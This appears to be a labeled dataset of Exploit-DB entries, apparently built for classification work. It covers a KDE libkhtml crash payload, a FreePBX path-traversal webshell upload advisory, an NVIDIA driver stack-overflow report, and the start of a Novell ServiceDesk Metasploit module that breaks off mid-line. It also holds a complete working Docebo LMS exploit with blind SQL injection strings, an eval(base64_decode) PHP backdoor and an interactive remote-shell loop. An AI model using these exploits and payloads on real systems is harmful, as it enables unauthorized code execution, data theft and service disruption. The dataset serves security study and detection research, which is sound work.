29296,"KDE LibkHTML 4.2 - NodeType Function Denial of Service source: https://www.securityfocus.com/bid/21662/info  KDE libkhtml is prone to a denial-of-service vulnerability.  This issue is triggered when an attacker convinces a victim user to open a malicious HTML document via an affected application such as kmail or Konqueror.   Remote attackers may exploit this issue to crash applications that use the affected library, effectively denying service to legitimate users.  <HTML> <HEAD> <RANGE <COL SPAN <>> <FRAMESET onload > </HEAD> </HTML>",convinces a victim user to open a malicious HTML document via an affected application,1
15098,"FreePBX 2.8.0 - Recordings Interface Allows Remote Code Execution Trustwave's SpiderLabs Security Advisory TWSL2010-005: FreePBX recordings interface allows remote code execution  https://www.trustwave.com/spiderlabs/advisories/TWSL2010-005.txt  Published: 2010-09-23 Version: 1.0  Vendor: FreePBX (http://www.freepbx.org/) Product: FreePBX and VOIP solutions (AsteriskNOW, TrixBox, etc) using it Version(s) affected: 2.8.0 and below  Product Description: FreePBX is an easy to use GUI (graphical user interface) that controls and manages Asterisk, the world's most popular open source telephony engine software. FreePBX has been developed and hardened by thousands of volunteers,has been downloaded over 5,000,000 times, and is utilized in an estimated 500,000 active phone systems.  Source: http://www.freepbx.org Credit: Wendel G. Henrique of Trustwave's SpiderLabs  CVE: CVE-2010-3490  Finding: The configuration interface for FreePBX is prone to a remote arbitrary code execution on the system recordings menu. FreePBX doesn't handle file uploads in a secure manner, allowing an attacker to manipulate the file extension and the beginning of the uploaded file name.  The piece of code below, found in page.recordings.php, illustrates part of the recordings upload feature.  /* Code removed to fit better on advisory */  <?php   if (isset($_FILES['ivrfile']['tmp_name']) &&   is_uploaded_file($_FILES['ivrfile']['tmp_name'])) {     if (empty($usersnum)) {       $dest = ""unnumbered-"";     } else {       $dest = ""{$usersnum}-"";     }     $suffix = substr(strrchr($_FILES['ivrfile']['name'], "".""), 1);     $destfilename = $recordings_save_path.$dest.""ivrrecording."".$suffix;     move_uploaded_file($_FILES['ivrfile']['tmp_name'], $destfilename);     echo ""<h6>""._(""Successfully uploaded"").""       "".$_FILES['ivrfile']['name'].""</h6>"";     $rname = rtrim(basename($_FILES['ivrfile']['name'], $suffix), '.');   } ?>  /* Code removed to fit better on advisory */  When a file is uploaded, a copy is saved temporarily under the /tmp/ directory, where the name of the file is composed of user-controlled-staticname.extension, where:  ""user-controlled"" is $usersnum variable. ""staticname"" value is -ivrrecording. ""extension"" is controlled by the user.  If $usersnum variable is not defined, then a static string (unnumbered) is used.  Finally, when the user clicks on the save button on the System Recordings interface, the file is saved with the original file name provided by the user under the /var/lib/asterisk/sounds/custom/ directory.  When uploading a file, an attacker can manipulate the $usersnum variable to perform a path traversal attack and save it anyplace that the web server user has access, for example the Apache's DocumentRoot. This allows an attacker to upload malicious code to the web server and execute it under the webserver's access permissions.  The HTTP request below illustrates the upload of a phpshell.  POST /admin/config.php HTTP/1.1 Host: 10.10.1.3 User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.7) Gecko/20101221 Firefox/3.5.7 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Proxy-Connection: keep-alive Referer: http://10.10.1.3/admin/config.php Cookie: ARI=cookieValue; PHPSESSID=cookieValue Authorization: Basic base64auth Content-Type: multipart/form-data; boundary=---------------------------5991806838789183981588991120 Content-Length: 116089  -----------------------------5991806838789183981588991120 Content-Disposition: form-data; name=""display""  recordings -----------------------------5991806838789183981588991120 Content-Disposition: form-data; name=""action""  recordings_start -----------------------------5991806838789183981588991120 Content-Disposition: form-data; name=""usersnum""  ../../../../../var/www/html/admin/SpiderLabs -----------------------------5991806838789183981588991120 Content-Disposition: form-data; name=""ivrfile""; filename=""webshell.php"" Content-Type: application/octet-stream  <?php /* WebShell code goes here */ ?>  -----------------------------5991806838789183981588991120--  To access the webshell in this example, an attacker would use the following path: http://10.10.1.3/admin/SpiderLabs-ivrrecording.php  Maintainer Response: The maintainer has released a patch to address this issue for all versions of the software 2.3 and newer.  Details of the patch can be found here: http://www.freepbx.org/trac/ticket/4553  Remediation Steps:  Install the maintainer-provided patch.  Vendor Communication Timeline: 08/13/10 - Initial contact 08/18/10 - Vulnerability disclosed 09/16/10 - Initial fix proposed by maintainer 09/22/10 - Fix reviewed, improved, and released by maintainer 09/23/10 - Advisory public release  Revision History:  1.0 Initial publication  About Trustwave: Trustwave is the leading provider of on-demand and subscription-based information security and payment card industry compliance management solutions to businesses and government entities throughout the world. For organizations faced with today's challenging data security and compliance environment, Trustwave provides a unique approach with comprehensive solutions that include its flagship TrustKeeper compliance management software and other proprietary security solutions. Trustwave has helped thousands of organizations--ranging from Fortune 500 businesses and large financial institutions to small and medium-sized retailers--manage compliance and secure their network infrastructure, data communications and critical information assets. Trustwave is headquartered in Chicago with offices throughout North America, South America, Europe, Africa, China and Australia. For more information, visit https://www.trustwave.com  About Trustwave's SpiderLabs: SpiderLabs is the advance security team at Trustwave responsible for incident response and forensics, ethical hacking and application security tests for Trustwave's clients. SpiderLabs has responded to hundreds of security incidents, performed thousands of ethical hacking exercises and tested the security of hundreds of business applications for Fortune 500 organizations. For more information visit https://www.trustwave.com/spiderlabs  Disclaimer: The information provided in this advisory is provided ""as is"" without warranty of any kind. Trustwave disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Trustwave or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Trustwave or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.",manipulate the $usersnum variable to perform a path traversal,1
40667,"NVIDIA Driver - Stack Buffer Overflow in Escape 0x7000014 Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=946  There is a missing bounds check in inner loop of the escape handler for 0x7000014 that leads to a stack buffer overflow:  ... for (DWORD i = 0; < escape->num_data; ++i) {   ...   // size is user controlled.   size = escape->data[i].size;   for (DWORD j = 0; j < size; ++j) {      stack_buf[j] = escape->data[...];   }  }  The attached PoC gives me the following crashing context (Win 10 x64, 372.54):  DRIVER_OVERRAN_STACK_BUFFER (f7) A driver has overrun a stack-based buffer.  This overrun could potentially allow a malicious user to gain control of this machine. ... ffffd000`23f94a78 fffff801`6e5deaf2 : ffffd000`23f95270 00000000`000000f7 ffffd000`23f94be0 fffff801`6e43c848 : nt!DbgBreakPointWithStatus ffffd000`23f94a80 fffff801`6e5de4c3 : 00000000`00000003 ffffd000`23f94be0 fffff801`6e56c600 00000000`000000f7 : nt!KiBugCheckDebugBreak+0x12 ffffd000`23f94ae0 fffff801`6e55fa44 : 00000000`00000000 00000000`00000000 ffffc001`c8e7202c fffff801`6e7188b8 : nt!KeBugCheck2+0x893 ffffd000`23f951f0 fffff800`c58e2bc6 : 00000000`000000f7 ffffd000`23f95270 000044dd`b2c37fec ffffbb22`4d3c8013 : nt!KeBugCheckEx+0x104 ffffd000`23f95230 fffff800`c57ba4ce : ffffd000`23f95220 ffffe000`69a62000 00000000`00000001 00000000`07000014 : nvlddmkm+0x192bc6 ffffd000`23f95270 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nvlddmkm+0x6a4ce   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40667.zip",a malicious user,1
18224,"Docebo Lms 4.0.4 - 'Messages' Remote Code Execution <?php /* Docebo LMS <= v4.0.4 (messages) remote code execution exploit vendor_________: http://www.docebo.com/ software link__: http://www.docebo.com/community/doceboCms/ author_________: mr_me::rwx kru email__________: steventhomasseeley!gmail!com  ""We must become the change we want to see in the world."" -Gandhi ------------------------------------------------------------- description: DoceboLMS is a SCORM compliant Open Source Cloud E-Learning platform used in corporate, government  and education markets. The Platform supports 25 languages and can be used with different didactic  models (Blended, Self-Directed, Collaborative and even Social Learning).  The application allows a superadministrator to inject and execute arbitray SQL into the backend database via an insert statment. Working, but its pointless.  Additionally, the application allows a low privlidged attacker (student or higher) to upload/inject  php code by creating a message attachment and sending it to a nonexistent user. After this, an attacker  can simply view the ""sent"" message only to then find their web shell conviently renamed. ----------------------------------------------------------------------------------  SQL Injection: ============== We start our code journey in lines 47-49 of ./doceboCore/index.php where we create the module. Then, lines 83-86 sets up the call to loadBody():   --> if($GLOBALS['modname'] != '') {         $module_cfg =& createModule($GLOBALS['modname']); }  ............  } elseif($GLOBALS['modname'] != '') {          $module_cfg->loadBody(); } <--  within ./lib/lib.istance.php, the createModule() function is defined and includes code for us to perform the loadBody() function on lines 60-64.  --> function &createModule($module_name, $class_name = NULL) {  ..................  	if(file_exists($where.'/class.module/class.'.$module_name.'.php')) {  		require_once($where.'/class.module/class.'.$module_name.'.php'); 		if( $class_name === NULL ) $class_name = $def_class_name.'_'.ucfirst($module_name); 	}  .................. 	 	return $module_cfg; } <--  lines 56 of ./class.module/class.iotask.php is where the loadBody function is delcared.  Later on lines 112 the function checks for the 'addconnection' is set in the GET request and calls  ioTask_UIConnectionNew() on the current object.  --> function loadBody() {  .......................  		} elseif( isset($_GET['addconnection']) && !isset($_POST['cancel']) ) { 			ioTask_UIConnectionNew($this, '', '' ); <--  lines 244 of ./doceboCore/modules/iotask/iotask.php defines the function ioTask_UIConnectionNew() on lines 255-264 we pass input from the GET/POST parameters to a function called parse_input() which simply sets the current configuration with our specfied 'coursereportuiconfig[name]' and  'coursereportuiconfig[description]' variables on the DoceboConnectorCourseExport instance.  Again, on lines 266-269 the code checks to see if the variable $action is set to 'finish' and if so it calls the save_connection() function with our injected DoceboConnectorCourseExport instance.  --> function ioTask_UIConnectionNew( &$module, $action, $subop ) {  ...........  	if( $subop == 'edit_connection' ) { 		$connection = $connMgr->create_connection_byname(key($action)); 	} else { 		$connection = $connMgr->create_connector_bytype($_POST['type_connection']); 	} 	$connectionUI = $connection->get_configUI(); 	print_r($connectionUI); 	$connectionUI->set_lang($lang); 	$connectionUI->set_form($form); 	$connectionUI->parse_input($_GET, $_POST);  	if( is_array($action) ) { 		if( key($action) == 'finish' ) { 			$connectionUI->go_finish(); 			if( $connMgr->save_connection( $connectionUI->get_old_name(), $connection ) ) <--  finally, lines 163-180 of ./doceboCore/lib/lib.iotask.php the save_connection function contains  the actual sql query: --> 	function save_connection( $old_name, $connection ) { 		$name = $connection->get_name(); 		$description = $connection->get_description(); 		$type = $connection->get_type_name(); 		$params = $connection->get_config(); 		$str_params = urlencode(serialize($params)); 		$lang =& $this->get_lang(); 		 		if( strlen(trim($name)) == 0 ) { 			$this->last_error = $lang->def('_OPERATION_FAILURE'); 			return FALSE; 		} 		 		if( $old_name === '' ) { 			$query = ""INSERT INTO "".$GLOBALS['prefix_fw'].""_connection"" 					.""(name,description,type,params)""  					."" VALUES "" 					.""('$name','$description','$type','$str_params')""; <--  Both the 'coursereportuiconfig[name]' and 'coursereportuiconfig[description]' variables are vulnerable to attack, but of course you need at least read access (ie teacher or admin):  An attacker can use blind sql injection to exploit this vulnerability very easily. However, they will need a valid  'authentic_request' and 'docebo_session' variables set in the request. The interesting thing is, the 'name' field in the db table is actually the primary key. So if you make multiple requests with the same 'name', the SQL Injection will execute but the integrity constraint will trigger and thus, not insert a record. sweet.  Example SQL injection: suntzu','course-export-connector',(CASE WHEN substr((SELECT version()),1,1)='5' THEN benchmark(5000000,md5(1)) ELSE 0 END))--+  PoC Request: POST /webapps/dc/doceboCore/index.php?modname=iotask&op=display&addconnection&gotab=connections HTTP/1.1 Host: 192.168.220.128 Cookie: docebo_session=pbkipn2uvsf4cjive88aadlnf1 Content-Type: application/x-www-form-urlencoded Content-Length: 659  authentic_request=debe0efcb991e3e3506fe10b99dc90d2&type_connection=course-export-connector&coursereportuiconfig%5Bname%5D=q&coursereportuiconfig%5Bdescription%5D=suntzu','course-export-connector',(CASE WHEN substr((SELECT version()),1,1)='4' THEN benchmark(5000000,md5(1)) ELSE 0 END))--+&coursereportuiconfig%5Bfirst_row_header%5D=1&coursereportuiconfig%5Bmemory%5D=a%253A5%253A%257Bs%253A4%253A%2522name%2522%253Bs%253A14%253A%2522New%2Bconnection%2522%253Bs%253A11%253A%2522description%2522%253Bs%253A0%253A%2522%2522%253Bs%253A16%253A%2522first_row_header%2522%253Bs%253A1%253A%25221%2522%253Bs%253A4%253A%2522step%2522%253Bs%253A1%253A%25220%2522%253Bs%253A8%253A%2522old_name%2522%253Bs%253A0%253A%2522%2522%253B%257D&action%5Bnew_connection%5D%5Bfinish%5D=Finish  Many other SQL Injections can be found and exploited easily in the forum and wiki (with low priv)... but yeah, whatever.  Arbitray file upload: =====================  line 35 of ./doceboLMS/index.php sets the GLOBAL array index 'modname' to our supplied value: --> $GLOBALS['modname'] = Get::req('modname', DOTY_ALPHANUM, ''); <--  then, lines 62-65 of ./doceboLMS/index.php triggers the createModule() function: --> if(!empty($GLOBALS['modname'])) { 	$module_cfg =& createModule($GLOBALS['modname']); 	if(method_exists($module_cfg, 'beforeLoad')) $module_cfg->beforeLoad(); } <--  lines 27-40 of ./doceboLms/lib/lib.istance.php createModule function contains a couple of includes..: --> function createModule($module_name, $class_name = NULL) { 	$module_name = preg_replace('/[^a-zA-Z0-9\-\_]+/', '', $module_name); 	if(file_exists(dirname(__FILE__).'/../class.module/class.'.$module_name.'.php')) { 		 		include_once(dirname(__FILE__).'/../class.module/class.'.$module_name.'.php'); 		if( $class_name === NULL ) $class_name = 'Module_'.ucfirst($module_name);  	} else {  		include_once(dirname(__FILE__).'/../class.module/class.definition.php'); 		$class_name = 'LmsModule'; 	} 	$module_cfg = new $class_name(); 	return $module_cfg; } <--  After the module is created, lines 110-113 of ./doceboLMS/index.php loads the module body: --> // load module body if(!empty($GLOBALS['modname'])) { 	$module_cfg->loadBody(); } <--  lines 11-16 of ./doceboLMS/class.module/class.message.php triggers the messageDispatch() function using the 'op' parameter: --> class Module_Message extends LmsModule { 	 	function loadBody() { 		 		require_once($GLOBALS['where_lms'].'/modules/message/message.php'); 		messageDispatch($GLOBALS['op']); 	} <--   lines 1114-1131 of ./doceboCore/lib/lib.message.php so that if the 'op' variable is set to  'writemessage' teh the code will trigger a call to writemessage() on the object: function messageDispatch($op, $mvc = false) {  	if(isset($_POST['undo'])) 	$op = 'message'; 	if(isset($_POST['okselector'])) 	$op = 'writemessage'; 	if(isset($_POST['cancelselector'])) $op = 'message'; 	if(isset($_POST['back_recipients'])) $op = 'addmessage';  	$module = new MessageModule($mvc);  	switch($op) { 		case ""message"" : { 			$module->message(); 		};break; 		case ""addmessage"" : { 			$module->addmessage(); 		};break; 		case ""writemessage"" : { 			$module->writemessage();   <--  within function writemessage() on lines 635 - 644 of ./doceboCore/lib/lib.message.php  we can see a call to saveMessageAttach() if the $_FILES array is populated from the file upload: --> 		if(isset($_POST['send'])) { 	 			if($_POST['message']['subject'] == '') { 				$output .= getErrorUi(Lang::t('_MUST_INS_SUBJECT')); 			} else { 				// send message 				$attach = ''; 				if($_FILES['message']['tmp_name']['attach'] != '') { 					$attach = $this->saveMessageAttach($_FILES['message']); 				} <--  lines 32-49 of ./doceboCore/lib/lib.message.php we can see how the filename is created: using the current users id, using mt_rand(), time() finally followed by the filename itself. --> 	function saveMessageAttach($attach) { 		require_once(_base_.'/lib/lib.upload.php'); 	 		$path = _PATH_MESSAGE; 		$file = ''; 		sl_open_fileoperations(); 		if(isset($attach['tmp_name']['attach']) && $attach['tmp_name']['attach'] != '') { 	 			$file = getLogUserId().'_'.mt_rand(0, 100).'_'.time().'_'.$attach['name']['attach']; 			if(!sl_upload($attach['tmp_name']['attach'], $path.$file)) { 				$error = 1; 				$file = ''; 			} 		} 		sl_close_fileoperations(); 		if(!$error) return $file; 		return false; 	} <--  lines 68-78 of ./lib/lib.upload.php checks the configuration for the upload type (default is filesystem) --> function sl_upload( $srcFile, $dstFile ) { 	$uploadType = Get::cfg('uploadType'); 	$dstFile =stripslashes($dstFile); 	if( $uploadType == ""ftp"" ) { 		return sl_upload_ftp( $srcFile, $dstFile ); 	} elseif( $uploadType == ""cgi"" ) { 		return sl_upload_cgi( $srcFile, $dstFile ); 	} else { 		return sl_upload_fs( $srcFile, $dstFile ); 	} } <--  lines 136 - 140 of ./lib/lib.upload.php actually performs the move_uploaded_file() function -->  function sl_upload_fs( $srcFile, $dstFile ) {  	$re = move_uploaded_file($srcFile, $GLOBALS['where_files_relative'].$dstFile); 	if(!$re) die(""Error on move_uploaded_file from: $srcFile to $dstFile""); 	return $re; } <--  All done without any validation on the file whatsoever. It should also be pointed out that many other file uploads exist in the application that can also be abused.  I just point out one example of each bug so the developers can hopefully spot and fix all of them. ----------------------------------------------------------------------------------  Timeline: - 01/12 discovered the bugs - 02/12 wrote the exploit - 04/12 reported bugs to the vendor http://bit.ly/rCGCsY - 05/12 Vendor confirms they got the bugs and are working on a fix - 05/12 acknowledgment http://bit.ly/u7qoD5 - 07/12 request a status update / timeframe http://bit.ly/w4ndcE - 08/12 no response, reminder http://bit.ly/rPdNCd - 09/12 no response? No remorse. - 10/12 public disclosure ----------------------------------- mr_me@gliese:~/pentest/web/0day/docebo$ php poc.php -t 192.168.220.128 -d /webapps/docebo/ -p 127.0.0.1:8080   ---------------------------------------------------------- Docebo LMS v4.0.4 (messages) remote code execution exploit by mr_me of rwx kru - net-ninja.net / rwx.biz.nf ---------------------------------------------------------- (+) Setting the proxy to 127.0.0.1:8080 (+) Grabbing session: docebo_session=lknh500ldp9avllmq5af5q3v96 (+) Grabbing login token: e5c8bb27d018ef97503b9c3c9eb8a53e (+) Logged into the application.. (+) Grabbing Logged in session: docebo_session=5up5becmbsv7mdaun6i9mp5i63 (+) Grabbing upload token: e5c8bb27d018ef97503b9c3c9eb8a53e (+) Creating malicious php message.. (+) Finding message id.. (+) Found message id: 18 (+) Finding web shell.. (+) Found web shell: 11837_90_1322716955_suntzu.php (+) Deleting backdoored message..  (+) Sucessfully deleted the message (+) Dropping to shell interaction..  mr_me@192.168.220.128# id uid=33(www-data) gid=33(www-data) groups=33(www-data) mr_me@192.168.220.128# uname -a Linux steve-web-server 2.6.35-31-generic #62-Ubuntu SMP Tue Nov 8 14:00:30 UTC 2011 i686 GNU/Linux mr_me@192.168.220.128#q */  print_r("" ---------------------------------------------------------- Docebo LMS v4.0.4 (messages) remote code execution exploit by mr_me of rwx kru - net-ninja.net / rwx.biz.nf ---------------------------------------------------------- "");  if ($argc < 3) { print_r("" ----------------------------------------------------------------------------- Usage: php "".$argv[0]."" -t <host:ip> -d <path> OPTIONS host:      target server (ip/hostname) path:      directory path to wordpress Options:  -p[ip:port]: specify a proxy Example: php "".$argv[0]."" -t 192.168.1.5 -d /docebo/ -p 127.0.0.1:8080 php "".$argv[0]."" -t 192.168.1.5 -d /docebo/ ----------------------------------------------------------------------------- ""); die;  }  /*      +-----------------+     student credentials    +-----------------+  */ $user = ""suntzu""; $pswd = ""suntzu"";  /* ----EOF--- */  error_reporting(7); ini_set(""max_execution_time"", 0); ini_set(""default_socket_timeout"", 5);  $proxy_regex = ""(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)"";  function setArgs($argv){ 	$_ARG = array(); 	foreach ($argv as $arg){ 		if (ereg(""--([^=]+)=(.*)"", $arg, $reg)){ 			$_ARG[$reg[1]] = $reg[2]; 		}elseif(ereg(""^-([a-zA-Z0-9])"", $arg, $reg)){ 			$_ARG[$reg[1]] = ""true""; 		}else { 			$_ARG[""input""][] = $arg; 		} 	} 	return $_ARG; }  $myArgs = setArgs($argv); $host = $myArgs[""input""][""1""]; $path = $myArgs[""input""][""2""];  if (strpos($host, "":"") == true){ 	$hostAndPort = explode("":"",$myArgs[""input""][1]); 	$host = $hostAndPort[0]; 	$port = (int)$hostAndPort[1]; }else{ 	$port = 80; }   if(strcmp($myArgs[""p""],""true"") === 0){ 	$proxyAndPort = explode("":"",$myArgs[""input""][3]); 	$proxy = $proxyAndPort[0]; 	$pport = $proxyAndPort[1];  	echo ""(+) Setting the proxy to "".$proxy."":"".$pport.""\r\n""; }else{     	echo ""(-) Warning, a proxy was not set\r\n""; }  // rgods sendpacketii() function function sendpacket($packet){ 	global $myArgs, $proxy, $host, $pport, $port, $html, $proxy_regex; 	if (strcmp($myArgs[""p""],""true"") != 0) { 		$ock = fsockopen(gethostbyname($host),$port); 		if (!$ock) { 			echo ""(-) No response from "".$host."":"".$port; die; 		} 	} 	else { 		$c = preg_match($proxy_regex,$proxy); 		if (!$c) { 			echo ""(-) Not a valid proxy...\n""; die; 		} 		$ock=fsockopen($proxy,$pport); 		if (!$ock) { 			echo ""(-) No response from proxy...""; die; 		} 	} 	fputs($ock,$packet); 	if ($proxy == """") { 		$html = """"; 		while (!feof($ock)) { 			$html .= fgets($ock); 		} 	}else { 		$html = """"; 		while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a), $html))) { 			$html .= fread($ock,1); 		} 	} 	fclose($ock); }  if (strcmp($myArgs[""p""], ""true"") != 0) {$p = $path;} else {$p = ""http://"".$host."":"".$port.$path;}  function get_session($html){ 	if (!preg_match(""/Set-Cookie: ([^;]*);/"", $html, $session)){ 		die(""\n[-] docebo_session not set!\n""); 	} 	return $session[1]; }  function get_token($html){ 	if (!preg_match(""/authentic_request\"" value=\""([^\""]*)/"", $html, $token)){ 		die(""\n[-] authentic_request token not found!\n""); 	} 	return $token[1]; }  function validate_login($html){ 	if (!preg_match(""/Location: ([^\r\n]*)\r\n/"", $html, $redirect)){ 		return 0; 	} 	$access_chk = explode(""?"",$redirect[1]); 	if (strcmp($access_chk[1],""access_fail=1"") === 0){ 		return 0;	 	} 	return 1; }   // get the 'authentic_request' token & the sessionID $packet  = ""GET "".$p.""index.php HTTP/1.1\r\n""; $packet .= ""host: "".$host.""\r\n\r\n""; sendpacket($packet);  $session = get_session($html); $token = get_token($html);  echo ""(+) Grabbing session: "".$session.""\n""; echo ""(+) Grabbing login token: "".$token.""\n"";  // login $data = ""authentic_request="".$token.""&login_userid="".$user.""&login_pwd="".$pswd.""&log_button=Login""; $login_pkt  = ""POST "".$p.""doceboLms/index.php?modname=login&op=confirm HTTP/1.1\r\n""; $login_pkt .= ""Host: "".$host.""\r\n""; $login_pkt .= ""Cookie: "".$session.""\r\n""; $login_pkt .= ""Content-Type: application/x-www-form-urlencoded\r\n""; $login_pkt .= ""Content-Length: "".strlen($data).""\r\n\r\n"".$data; sendpacket($login_pkt);  if (validate_login($html)){ 	echo ""(+) Logged into the application..\n""; }else{  	die(""(-) Login failed!\n"");	 }  $session = get_session($html); echo ""(+) Grabbing Logged in session: "".$session.""\n"";  // now for the upload $packet  = ""GET "".$p.""doceboLms/index.php?modname=message&op=addmessage&from=out HTTP/1.1\r\n""; $packet .= ""Host: "".$host.""\r\n""; $packet .= ""Cookie: "".$session.""\r\n\r\n""; sendpacket($packet); $token = get_token($html);  echo ""(+) Grabbing upload token: "".$token.""\n""; $php_code = ""<?php error_reporting(0); eval(base64_decode(\$_SERVER[HTTP_HAX])) ?>""; $payload  = ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""authentic_request\""\r\n\r\n""; $payload .= $token.""\r\n""; $payload .= ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""out\""\r\n\r\n""; $payload .= ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""msg_course_filter\""\r\n\r\n""; $payload .= ""0\r\n""; $payload .= ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""message[recipients]\""\r\n\r\n""; // send to a nonexistant userid $payload .= urlencode(""a:1:{i:0;s:5:\""0\"";}"").""\r\n""; $payload .= ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""message[subject]\""\r\n\r\n""; $payload .= ""suntzu\r\n""; $payload .= ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""message[priority]\""\r\n\r\n""; $payload .= ""1\r\n""; $payload .= ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""message_textof\""\r\n\r\n""; $payload .= ""suntzu\r\n""; $payload .= ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""message[attach]\""; filename=\""suntzu.php\""\r\n\r\n""; $payload .= $php_code.""\r\n""; $payload .= ""--o0oOo0o\r\n""; $payload .= ""Content-Disposition: form-data; name=\""send\""\r\n\r\n""; $payload .= ""Send\r\n"";				 $payload .= ""--o0oOo0o\r\n"";  $killpkt = ""POST "".$p.""doceboLms/index.php?modname=message&op=writemessage HTTP/1.1\r\n""; $killpkt .= ""Host: "".$host.""\r\n""; $killpkt .= ""Cookie: "".$session.""\r\n""; $killpkt .= ""Content-Type: multipart/form-data; boundary=o0oOo0o\r\n""; $killpkt .= ""Content-Length: "".strlen($payload).""\r\n""; $killpkt .= ""Connection: close\r\n\r\n"".$payload;  echo ""(+) Creating malicious php message..\n""; sendpacket($killpkt);  // now to find the shell echo ""(+) Finding message id..\n""; $packet  = ""GET "".$p.""doceboLms/index.php?modname=message&op=message&sop=unregistercourse HTTP/1.1\r\n""; $packet .= ""Host: "".$host.""\r\n""; $packet .= ""Cookie: "".$session.""\r\n\r\n""; sendpacket($packet);  if (!preg_match(""/id_message=([^\""]*)/"", $html, $message)){ 	die(""\n[-] Unable to find sent message id!\n""); }else{ 	echo ""(+) Found message id: "".$message[1].""\n""; }  echo ""(+) Finding web shell..\n""; $packet  = ""GET "".$p.""doceboLms/index.php?modname=message&op=readmessage&id_message="".$message[1]."" HTTP/1.1\r\n""; $packet .= ""Host: "".$host.""\r\n""; $packet .= ""Cookie: "".$session.""\r\n\r\n""; sendpacket($packet);  if (!preg_match(""/alt=\""mime\"" \/\>([^<]*)/"", $html, $shell)){ 	die(""\n[-] Unable to find web shell :/\n""); }else{ 	echo ""(+) Found web shell: "".$shell[1].""\n""; 	 }  $phpshell = $shell[1];  echo ""(+) Deleting backdoored message.. \n""; $deletemessage  = ""doceboLms/index.php?modname=message&op=delmessage&id_message="".$message[1]; $deletemessage .= ""&out=out&confirm=1""; $packet  = ""GET "".$p.$deletemessage."" HTTP/1.1\r\n""; $packet .= ""Host: "".$host.""\r\n""; $packet .= ""Cookie: "".$session.""\r\n\r\n""; sendpacket($packet);  if (preg_match(""/Location: ([^\r\n]*)\r\n/"", $html, $delete_test)){ 	if (preg_match(""/result=([^\r\n]*)/"", $delete_test[1],$ok_del)){ 		if (strcmp(""$ok_del[1]"",""ok_del"") === 0){ 			echo ""(+) Sucessfully deleted the message\n""; 		} 	} }else{ 	echo(""\n(-) Warning: unable to deleted the message :/\n""); }  echo ""(+) Dropping to shell interaction..\n"";  // change the php function if your target doesnt support it $php_functions = array(""passthru"", ""system""); $php_func = array_rand($php_functions, 2); $php_func = $php_functions[$php_func[0]];  while ($cmd != ""q""){ 	echo ""\n"".get_current_user().""@"".$host.""# ""; 	$cmd = trim(fgets(STDIN)); 	$c = base64_encode($php_func.""("".""\"""".$cmd.""\""""."");""); 	$packet  = ""POST "".$p.""files/doceboLms/message/"".$phpshell."" HTTP/1.1\r\n""; 	$packet .= ""Host: "".$host.""\r\n""; 	$packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; 	$packet .= ""Hax: "".$c.""\r\n\r\n""; 	if ($cmd != ""q""){ 		sendpacket($packet); 		$html = explode(""html"",$html); 		echo (trim($html[1]));     	} } ?>",creating a message attachment and sending it to a nonexistent user,1
39708,"Novell ServiceDesk - (Authenticated) Arbitrary File Upload (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::FileDropper   include Msf::Exploit::EXE    def initialize(info = {})     super(update_info(info,       'Name'           => 'Novell ServiceDesk Authenticated File Upload',       'Description'    => %q{         This module exploits an authenticated arbitrary file upload via directory traversal         to execute code on the target. It has been tested on versions 6.5 and 7.1.0, in         Windows and Linux installations of Novell ServiceDesk, as well as the Virtual         Appliance provided by Novell.       },       'Author'         =>         [           'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module         ],       'License'        => MSF_LICENSE,       'References'     =>         [           [ 'CVE', '2016-1593' ],           [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/novell-service-desk-7.1.0.txt' ],           [ 'URL', 'http://seclists.org/bugtraq/2016/Apr/64' ]         ],       'Platform'    => %w{ linux win },       'Arch'           => ARCH_X86,       'DefaultOptions' => { 'WfsDelay' => 15 },       'Targets'        =>         [           [ 'Automatic', {} ],           [ 'Novell ServiceDesk / Linux',             {               'Platform' => 'linux',               'Arch' => ARCH_X86             }           ],           [ 'Novell ServiceDesk / Windows',             {               'Platform' => 'win',               'Arch' => ARCH_X86             }           ],         ],       'Privileged'     => false,  # Privileged on Windows but not on (most) Linux targets       'DefaultTarget'  => 0,       'DisclosureDate' => 'Mar 30 2016'     ))      register_options(       [         OptPort.new('RPORT',           [true, 'The target port', 80]),         OptString.new('USERNAME',           [true, 'The username to login as', 'admin']),         OptString.new('PASSWORD',           [true, 'Password for the specified username', 'admin']),         OptString.new('TRAVERSAL_PATH',           [false, 'Traversal path to tomcat/webapps/LiveTime/'])       ], self.class)   end     def get_version     res = send_request_cgi({       'uri'    => normalize_uri('LiveTime','WebObjects','LiveTime.woa'),       'method' => 'GET',       'headers' => {         'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',       }     })      if res && res.code == 200 && res.body.to_s =~ /\<p 